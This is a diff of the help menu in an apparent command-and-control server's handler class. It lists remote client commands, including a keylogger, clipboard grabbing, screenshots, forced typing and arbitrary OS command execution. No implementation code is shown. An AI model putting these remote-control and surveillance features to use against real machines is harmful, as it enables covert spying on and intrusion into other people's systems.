@@ -167,13 +167,15 @@ class C2Handler(BaseHTTPRequestHandler):
                               "client kill - permanently shutdown the active client",
                               "client delay SECONDS - change the delay setting for a client's reconnection attempts"
                               "client get clipboard - grab a copy of the client's clipboard",
+                              "client type - force typing to client",
                               "client keylog on - start up a keylogger on the client",
-                              "client keylog off - turn off the keylogger on the client and write the results to disk"
-                              "client screenshot - grab a copy of the client's screens (coming soon)",
-                              "client display FILENAME - display an image on the client's screen (coming soon)",
-                              "client flip screen - flip a client's screen upside down (coming soon)",
-                              "client max sound - turn a client's volume all the way up (coming soon)",
-                              "client play FILENAME.wav - play a .wav sound file on the client (coming soon)",
+                              "client keylog off - turn off the keylogger on the client and write the results to disk",
+                              "client screenshot - grab a copy of the client's screens (buggy and need to be corrected for Linux)",
+                              "client display IMAGE - display an image on the client's screen",
+                              "client flip screen - flip a client's screen upside down (Only for Windows)",
+                              "client rotate screen - rotate the client's screen (Only for Windows)",
+                              "client max sound - turn a client's volume all the way up",
+                              "client play FILENAME.wav - play a .wav sound file on the client",
                               "* - run an OS command on the client that doesn't require input",
                               "* & - run an OS command on the client in the background (coming soon)", sep="\n")
                         print("\nServer Commands:",
